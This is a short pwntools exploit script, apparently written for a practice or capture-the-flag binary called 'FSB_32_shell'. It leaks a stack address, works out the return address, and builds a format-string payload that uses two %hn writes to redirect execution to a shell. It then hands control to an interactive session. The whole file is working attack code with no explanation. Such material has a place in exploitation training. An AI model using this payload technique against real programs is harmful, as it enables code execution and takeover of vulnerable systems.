from pwn import *
context.terminal=['tmux', 'splitw', '-h']
p = process('./FSB_32_shell')
#0x0000000000401166

buf = int(p.recv(10),16)
ret_addr = buf + 0xd4
shell1 = 0x91a6
shell2 = 0x0804

payload = b''
payload += p32(ret_addr + 2)
payload += p32(ret_addr)
payload += b'%' + str(shell2 - 8).encode() + b'c'
payload += b'%1$hn'
payload += b'%' + str(shell1-shell2).encode() + b'c'
payload += b'%2$hn'

p.send(payload)
p.interactive()